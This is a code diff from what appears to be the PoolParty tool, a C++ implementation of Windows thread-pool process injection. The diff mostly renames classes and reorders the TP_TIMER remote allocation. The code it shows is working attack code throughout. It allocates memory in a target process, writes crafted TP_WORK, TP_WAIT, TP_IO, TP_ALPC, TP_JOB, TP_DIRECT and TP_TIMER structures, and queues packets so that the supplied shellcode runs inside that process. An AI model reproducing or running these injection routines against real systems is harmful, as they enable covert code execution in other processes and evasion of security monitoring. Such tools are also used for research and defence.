@@ -105,18 +105,18 @@ void WorkerFactoryStartRoutineOverwrite::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << boost::format("Set target process worker factory minimum threads to: %d") % WorkerFactoryMinimumThreadNumber;
 }
 
-RemoteWorkItemInsertion::RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+RemoteTpWorkInsertion::RemoteTpWorkInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
 	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
-void RemoteWorkItemInsertion::HijackHandles()
+void RemoteTpWorkInsertion::HijackHandles()
 {
 	m_p_hWorkerFactory = this->GetTargetThreadPoolWorkerFactoryHandle();
 }
 
 
-void RemoteWorkItemInsertion::SetupExecution() const
+void RemoteTpWorkInsertion::SetupExecution() const
 {
 	auto WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*m_p_hWorkerFactory);
 
@@ -145,12 +145,12 @@ void RemoteWorkItemInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK";
 }
 
-RemoteWaitCallbackInsertion::RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+RemoteTpWaitInsertion::RemoteTpWaitInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
 	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
-void RemoteWaitCallbackInsertion::SetupExecution() const
+void RemoteTpWaitInsertion::SetupExecution() const
 {
 	const auto pTpWait = w_CreateThreadpoolWait(static_cast<PTP_WAIT_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
 	BOOST_LOG_TRIVIAL(info) << "Created TP_WAIT structure associated with the shellcode";
@@ -175,12 +175,12 @@ void RemoteWaitCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Set event to queue a packet to the IO completion port of the target process worker factory ";
 }
 
-RemoteIoCompletionCallbackInsertion::RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+RemoteTpIoInsertion::RemoteTpIoInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
 	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
-void RemoteIoCompletionCallbackInsertion::SetupExecution() const
+void RemoteTpIoInsertion::SetupExecution() const
 {
 	const auto p_hFile = w_CreateFile(
 		POOL_PARTY_FILE_NAME,
@@ -219,13 +219,13 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << boost::format("Write to file `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);
 }
 
-RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+RemoteTpAlpcInsertion::RemoteTpAlpcInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
 	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
 // TODO: Add RAII wrappers here for ALPC funcs
-void RemoteAlpcCallbackInsertion::SetupExecution() const
+void RemoteTpAlpcInsertion::SetupExecution() const
 {
 	/* We can not re-set the ALPC object IO completion port, so we create a temporary ALPC object that will only be used to allocate a TP_ALPC structure */
 	const auto hTempAlpcConnectionPort = w_NtAlpcCreatePort(nullptr, nullptr);
@@ -247,8 +247,6 @@ void RemoteAlpcCallbackInsertion::SetupExecution() const
 
 	const auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Created pool party ALPC port `%s`: %d") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME) % hAlpcConnectionPort;
-
-	pTpAlpc->AlpcPort = hAlpcConnectionPort;
 	
 	const auto pRemoteTpAlpc = static_cast<PFULL_TP_ALPC>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_ALPC memory in the target process: %p") % pRemoteTpAlpc;
@@ -291,12 +289,12 @@ void RemoteAlpcCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << boost::format("Connected to ALPC port `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME);
 }
 
-RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+RemoteTpJobInsertion::RemoteTpJobInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
 	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
-void RemoteJobCallbackInsertion::SetupExecution() const
+void RemoteTpJobInsertion::SetupExecution() const
 {
 	const auto p_hJob = w_CreateJobObject(nullptr, const_cast<LPWSTR>(POOL_PARTY_JOB_NAME));
 	BOOST_LOG_TRIVIAL(info) << boost::format("Created job object with name `%s`") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);
@@ -323,12 +321,12 @@ void RemoteJobCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << boost::format("Assigned current process to job object `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);
 }
 
-RemoteDirectCallbackInsertion::RemoteDirectCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+RemoteTpDirectInsertion::RemoteTpDirectInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
 	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
-void RemoteDirectCallbackInsertion::SetupExecution() const
+void RemoteTpDirectInsertion::SetupExecution() const
 {
 	TP_DIRECT Direct{ 0 };
 	Direct.Callback = m_ShellcodeAddress;
@@ -343,34 +341,33 @@ void RemoteDirectCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Queued a packet to the IO completion port of the target process worker factory";
 }
 
-RemoteTimerCallbackInsertion::RemoteTimerCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+RemoteTpTimerInsertion::RemoteTpTimerInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
 	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
-void RemoteTimerCallbackInsertion::HijackHandles()
+void RemoteTpTimerInsertion::HijackHandles()
 {
 	m_p_hWorkerFactory = this->GetTargetThreadPoolWorkerFactoryHandle();
 	m_p_hTimer = this->GetTargetThreadPoolTimerHandle();
 }
 
-void RemoteTimerCallbackInsertion::SetupExecution() const
+void RemoteTpTimerInsertion::SetupExecution() const
 {
 	auto WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*m_p_hWorkerFactory);
 
 	const auto pTpTimer = w_CreateThreadpoolTimer(static_cast<PTP_TIMER_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
 	BOOST_LOG_TRIVIAL(info) << "Created TP_TIMER structure associated with the shellcode";
 
+	/* Some changes in the TpTimer requires to know the remote TpTimer address, so first allocate, then perform changes, then write */
+	const auto RemoteTpTimerAddress = static_cast<PFULL_TP_TIMER>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_TIMER memory in the target process: %p") % RemoteTpTimerAddress;
+
 	const auto Timeout = -10000000;
 	pTpTimer->Work.CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(WorkerFactoryInformation.StartParameter);
 	pTpTimer->DueTime = Timeout;
 	pTpTimer->WindowStartLinks.Key = Timeout;
 	pTpTimer->WindowEndLinks.Key = Timeout;
-	BOOST_LOG_TRIVIAL(info) << "Performed TpSetTimerEx actions on TP_TIMER";
-
-	const auto RemoteTpTimerAddress = static_cast<PFULL_TP_TIMER>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_TIMER memory in the target process: %p") % RemoteTpTimerAddress;
-
 	pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
 	pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
 	pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
